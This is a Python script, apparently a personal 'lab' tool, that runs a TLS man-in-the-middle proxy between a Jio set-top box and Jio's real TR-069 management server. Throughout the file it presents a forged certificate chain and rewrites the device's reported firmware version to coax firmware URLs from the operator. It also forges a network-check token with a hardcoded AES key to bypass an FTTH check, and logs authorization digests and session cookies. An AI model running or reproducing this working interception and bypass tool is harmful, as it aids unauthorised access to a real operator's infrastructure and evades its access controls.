import ssl
import socket
import threading
import datetime
import os
import re
import base64
import json
import gzip
import http.client
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = os.path.dirname(os.path.abspath(__file__))
CERT_FILE = os.path.join(BASE, "forged_chain.pem")
PORTS = [7443, 8443, 9443]
BIND_ADDR = "0.0.0.0"
TRAFFIC_LOG = os.path.join(BASE, "fota_acs_traffic.log")
PARAMS_JSON = os.path.join(BASE, "fota_device_params.json")
UPDATE_FOUND_FILE = os.path.join(BASE, "fota_update_found.json")
FIRMWARE_URL_FILE = os.path.join(BASE, "fota_firmware_url.txt")

# --- Upstream Real ACS Configuration ---
FORWARD_TO_REAL_ACS = True
REAL_ACS_HOST = "acs.oss.jio.com"
REAL_ACS_PORT = 8443
# Known public IP for acs.oss.jio.com to avoid local loopback/alias collision
REAL_ACS_IP = "49.40.134.113"

# --- Firmware Version Spoofing ---
# Replace current device firmware with older version to test if an update is offered
CURRENT_FIRMWARE = "STB-JHSD200-11.3.46"
SPOOFED_VERSION_FILE = os.path.join(BASE, "spoofed_version.txt")

def get_spoofed_firmware():
    if os.path.exists(SPOOFED_VERSION_FILE):
        try:
            with open(SPOOFED_VERSION_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        return line
        except Exception:
            pass
    return "STB-JHSD200-11.1.0"

# --- Netcheck Bypass ---
try:
    from Crypto.Cipher import AES
    _HAVE_AES = True
except Exception:
    _HAVE_AES = False

NETCHECK_KEY = b"6bm2I7pTdBaeABX0"
NETTYPE = "FTTH"
_PRECOMPUTED_NETCHECK = "UzLgdFHvJkBfRQiHnNQit+55dub3o1PbxIhuNZ7oJc8="

def _forge_netcheck():
    if not _HAVE_AES:
        return _PRECOMPUTED_NETCHECK
    iv = os.urandom(16)
    data = NETTYPE.encode()
    pl = 16 - (len(data) % 16)
    data += bytes([pl]) * pl
    ct = AES.new(NETCHECK_KEY, AES.MODE_CBC, iv).encrypt(data)
    return base64.b64encode(iv + ct).decode()

# --- Fallback Mock SOAP Templates (if Real ACS unreachable) ---
INFORM_RESPONSE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<soap-env:Envelope xmlns:soap-enc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<soap-env:Header><cwmp:ID soap-env:mustUnderstand="1">{ID}</cwmp:ID></soap-env:Header>
<soap-env:Body><cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse></soap-env:Body>
</soap-env:Envelope>"""

loglock = threading.Lock()
SESSIONS = {}
SESSIONS_LOCK = threading.Lock()

def log(msg, also_file=True):
    with loglock:
        ts = datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]
        line = f"[{ts}] {msg}"
        print(line, flush=True)
        if also_file:
            try:
                with open(TRAFFIC_LOG, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
            except Exception:
                pass

# Local TLS context for listening to STB
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(CERT_FILE)
try:
    ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
except Exception:
    pass

# Upstream TLS context for connecting to real Jio ACS
upstream_ctx = ssl._create_unverified_context()
try:
    upstream_ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
except Exception:
    pass

def parse_cookie(headers):
    cookie_header = headers.get("cookie", "")
    if not cookie_header:
        return None
    m = re.search(r'(?:session|JSESSIONID)=([^;,\s]+)', cookie_header)
    return m.group(1) if m else None

def read_http(rf):
    try:
        line = rf.readline()
        if not line:
            return None
        reqline = line.decode("latin1").rstrip("\r\n")
        headers = {}
        while True:
            h = rf.readline()
            if not h or h in (b"\r\n", b"\n"):
                break
            k, _, v = h.decode("latin1").partition(":")
            headers[k.strip().lower()] = v.strip()
        body = b""
        if "content-length" in headers:
            n = int(headers["content-length"])
            body = rf.read(n) if n else b""
        return reqline, headers, body
    except Exception:
        return None

def extract_cwmp_id(body_str):
    m = re.search(r'<cwmp:ID[^>]*>([^<]+)</cwmp:ID>', body_str)
    return m.group(1) if m else "1"

def extract_parameters_from_xml(xml_str):
    params = {}
    try:
        matches = re.findall(r'<ParameterValueStruct>.*?<Name>([^<]+)</Name>.*?<Value[^>]*>([^<]*)</Value>', xml_str, re.DOTALL)
        for name, val in matches:
            params[name.strip()] = val.strip()
    except Exception as e:
        log(f"[PARSE-ERR] {e}")
    return params

def check_for_firmware_update(body_bytes, headers):
    try:
        raw_text = body_bytes.decode("utf-8", errors="replace")
    except Exception:
        return
    
    # Check for CWMP Download RPC or common firmware indicators
    download_indicators = ["cwmp:Download", "<FileType>", "1 Firmware Upgrade Image", ".bin", ".zip", ".pkg"]
    found_urls = re.findall(r'https?://[^\s<>"\']+', raw_text)
    
    is_update = any(ind in raw_text for ind in download_indicators)
    if is_update or (found_urls and ("download" in raw_text.lower() or "firmware" in raw_text.lower())):
        log("\n" + "=" * 70)
        log("🎉 [ALERT] FIRMWARE UPDATE DETECTED FROM REAL JIO ACS!")
        log("=" * 70)
        for url in found_urls:
            log(f"   ★ UPDATE URL: {url}")
            try:
                with open(FIRMWARE_URL_FILE, "a", encoding="utf-8") as f:
                    f.write(url + "\n")
            except Exception:
                pass
        
        # Save complete XML response
        try:
            with open(UPDATE_FOUND_FILE, "w", encoding="utf-8") as f:
                json.dump({
                    "timestamp": datetime.datetime.now().isoformat(),
                    "urls": found_urls,
                    "raw_response": raw_text
                }, f, indent=2)
            log(f"   ★ Full details saved to: {UPDATE_FOUND_FILE}")
        except Exception:
            pass
        log("=" * 70 + "\n")

def forward_to_real(reqline, headers, body, client_str):
    parts = reqline.split()
    method = parts[0] if parts else "POST"
    path = parts[1] if len(parts) > 1 else "/ftacs-digest/ACS"

    # 1. Rewrite SoftwareVersion in body if present
    modified_body = body
    spoofed = get_spoofed_firmware()
    if body and CURRENT_FIRMWARE.encode() in body:
        log(f"[MITM-REWRITE] Replacing {CURRENT_FIRMWARE} -> {spoofed} in request from {client_str}")
        modified_body = body.replace(CURRENT_FIRMWARE.encode(), spoofed.encode())

    # 2. Prepare headers for upstream
    forward_headers = {k: v for k, v in headers.items() if k not in ("host", "connection", "content-length")}
    forward_headers["host"] = REAL_ACS_HOST
    forward_headers["content-length"] = str(len(modified_body))
    forward_headers["connection"] = "keep-alive"

    log(f"[UPSTREAM-SEND] Forwarding {method} {path} ({len(modified_body)} bytes) to https://{REAL_ACS_IP}:{REAL_ACS_PORT}...")
    
    conn = http.client.HTTPSConnection(REAL_ACS_IP, REAL_ACS_PORT, context=upstream_ctx, timeout=30)
    try:
        conn.request(method, path, body=modified_body, headers=forward_headers)
        resp = conn.getresponse()
        resp_body = resp.read()
        resp_headers = dict(resp.getheaders())
        
        log(f"[UPSTREAM-RECV] Status: {resp.status} {resp.reason} ({len(resp_body)} bytes)")
        if "www-authenticate" in resp_headers:
            log(f"   ★ Digest Challenge: {resp_headers['www-authenticate'][:80]}...")
        if "set-cookie" in resp_headers:
            log(f"   ★ Set-Cookie: {resp_headers['set-cookie']}")
        
        # Check if real ACS sent a firmware download payload
        if resp_body:
            check_for_firmware_update(resp_body, resp_headers)
            body_preview = resp_body.decode("utf-8", errors="replace")[:400].strip()
            log(f"   ★ Response Preview: {body_preview}")

        return resp.status, resp.reason, resp.getheaders(), resp_body
    except Exception as e:
        log(f"[UPSTREAM-ERR] Failed connecting to real ACS: {e}")
        return None

def handle(conn, addr):
    client_str = f"{addr[0]}:{addr[1]}"
    try:
        rf = conn.makefile("rb")
        wf = conn.makefile("wb")
        while True:
            req = read_http(rf)
            if not req:
                break
            reqline, headers, body = req
            parts = reqline.split()
            method = parts[0] if parts else "GET"
            path = parts[1] if len(parts) > 1 else "/"
            body_str = body.decode("utf-8", errors="replace")

            log(f">>> {client_str} {reqline}")
            if "authorization" in headers:
                log(f"    [AUTH-DIGEST] Authorization: {headers['authorization'][:70]}...")
            if body_str:
                log(f"    Body ({len(body)} bytes):\n{body_str.strip()}\n")

            # 1. /network/check -> Return forged FTTH token immediately
            if "/network/check" in path:
                token = _forge_netcheck()
                resp_body = f'{{"response":"{token}"}}'.encode("utf-8")
                wf.write(b"HTTP/1.1 200 OK\r\n")
                wf.write(b"Content-Type: application/json\r\n")
                wf.write(f"Content-Length: {len(resp_body)}\r\n".encode())
                wf.write(b"Connection: keep-alive\r\n\r\n")
                wf.write(resp_body)
                wf.flush()
                log(f"<<< {client_str} /network/check -> Returned forged FTTH token")
                continue

            # 2. Extract Device Info from Inform if present
            if "cwmp:Inform" in body_str:
                cwmp_id = extract_cwmp_id(body_str)
                log(f"[CWMP-INFORM] Received Inform from {client_str} (ID={cwmp_id})")
                extracted = extract_parameters_from_xml(body_str)
                if extracted:
                    log(f"[DEVICE-REPORT] Extracted {len(extracted)} parameters from Inform:")
                    for k, v in sorted(extracted.items()):
                        if any(term in k for term in ["FOTA", "Software", "Hardware", "Version", "Status", "Model"]):
                            log(f"   ★ {k} = {v}")
                    try:
                        with open(PARAMS_JSON, "w", encoding="utf-8") as jf:
                            json.dump(extracted, jf, indent=2)
                    except Exception:
                        pass

            # 3. Forward to Real ACS with Version Spoofing
            if FORWARD_TO_REAL_ACS:
                res = forward_to_real(reqline, headers, body, client_str)
                if res is not None:
                    status, reason, resp_headers_list, resp_body = res
                    # Relay real ACS response back to STB
                    out = [f"HTTP/1.1 {status} {reason}"]
                    for k, v in resp_headers_list:
                        if k.lower() in ("transfer-encoding", "connection"):
                            continue
                        out.append(f"{k}: {v}")
                    out.append(f"Content-Length: {len(resp_body)}")
                    out.append("Connection: keep-alive")
                    
                    wf.write(("\r\n".join(out) + "\r\n\r\n").encode("latin1") + resp_body)
                    wf.flush()
                    log(f"<<< {client_str} Relayed {status} {reason} from Real ACS to STB")
                    continue
                else:
                    log(f"[WARN] Upstream failed, using local fallback InformResponse")

            # 4. Fallback Local Response (only if forwarding disabled or failed)
            cwmp_id = extract_cwmp_id(body_str)
            resp_body = INFORM_RESPONSE_TEMPLATE.format(ID=cwmp_id).encode("utf-8")
            wf.write(b"HTTP/1.1 200 OK\r\n")
            wf.write(b"Content-Type: text/xml; charset=utf-8\r\n")
            wf.write(f"Content-Length: {len(resp_body)}\r\n".encode())
            wf.write(b"Connection: keep-alive\r\n\r\n")
            wf.write(resp_body)
            wf.flush()
            log(f"<<< {client_str} Fallback: Sent local InformResponse")

    except Exception as e:
        log(f"[ERR] {client_str}: {e}")
    finally:
        try:
            conn.close()
        except Exception:
            pass

def listen(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((BIND_ADDR, port))
    s.listen(10)
    log(f"FOTA MITM Interceptor listening on port {port} (TLS)")
    while True:
        try:
            raw, addr = s.accept()
            tls = ctx.wrap_socket(raw, server_side=True)
            threading.Thread(target=handle, args=(tls, addr), daemon=True).start()
        except Exception as e:
            log(f"Accept error on {port}: {e}")

def main():
    log("===========================================================")
    log("  JIO STB FOTA & TR-069 MITM FORWARDER LAB                 ")
    log(f"  Mode: Forward to Real Jio ACS ({REAL_ACS_HOST})")
    log(f"  Version Spoof: {CURRENT_FIRMWARE} -> {get_spoofed_firmware()}")
    log(f"  Logs saved to: {TRAFFIC_LOG}")
    log("===========================================================")
    for p in PORTS:
        threading.Thread(target=listen, args=(p,), daemon=True).start()
    try:
        while True:
            threading.Event().wait(1.0)
    except KeyboardInterrupt:
        log("FOTA MITM Interceptor stopped.")

if __name__ == "__main__":
    main()
